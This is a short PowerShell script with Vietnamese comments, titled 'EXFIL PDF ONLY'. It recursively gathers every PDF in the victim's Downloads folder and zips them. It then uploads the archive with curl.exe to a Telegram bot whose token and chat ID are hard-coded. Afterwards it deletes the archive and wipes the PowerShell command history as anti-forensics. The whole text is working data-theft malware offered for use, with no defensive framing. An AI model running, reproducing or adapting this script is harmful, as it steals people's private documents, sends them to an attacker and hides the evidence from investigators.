<# 
============================================ EXFIL PDF ONLY ============================================
#>
# 1. Thông tin cấu hình cố định (Thay Token của bạn nếu cần)
$Token  = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"

# 2. Thiết lập đường dẫn mục tiêu
$TargetFolder = Join-Path $env:USERPROFILE "Downloads"
$zipPath = "$env:TEMP\Data_PDF.zip"

# 3. Gom và nén file PDF
Add-Type -AssemblyName System.IO.Compression.FileSystem

if (Test-Path $TargetFolder) {
    # Tìm tất cả file .pdf trong Downloads (bao gồm cả thư mục con)
    $pdffiles = Get-ChildItem -Path $TargetFolder -Filter "*.pdf" -File -Recurse -ErrorAction SilentlyContinue

    if ($pdffiles.Count -gt 0) {
        # Tạo file nén mới
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')

        foreach ($file in $pdffiles) {
            try {
                # Tạo entry và nén (giữ tên file)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $file.Name)
            } catch { continue }
        }
        $zipArchive.Dispose()

        # 4. Gửi qua Telegram bằng curl.exe
        if ((Get-Item $zipPath).Length -gt 22) {
            curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$zipPath" | Out-Null
        }
        
        # 5. Xóa dấu vết vật lý
        Remove-Item $zipPath -Force
    }
}

# Xóa lịch sử lệnh PowerShell (Anti-Forensics)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
